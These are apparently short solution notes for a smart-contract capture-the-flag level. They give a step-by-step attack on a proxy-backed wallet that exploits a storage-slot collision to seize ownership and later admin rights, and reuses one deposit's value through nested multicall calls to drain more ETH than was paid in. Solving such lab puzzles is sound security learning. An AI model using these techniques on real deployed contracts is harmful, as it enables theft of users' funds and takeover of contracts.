1. proposeNewAdmin in Proxy -> the pendingAdmin slot in Proxy == the owner slot in Wallet
2. call await contract.addToWhitelist("your address")
3. deposit 0.001 eth twice:
   1. depositData = await contract.methods["deposit()"].request().then(v => v.data)
   2. multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
   3. await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
4. await contract.execute("your address", toWei('0.002'), 0x0) -> withdrawing all eth
5. call await contract.setMaxBalance("your address") -> the maxBalance slot in Wallet == the admin slot in Proxy
















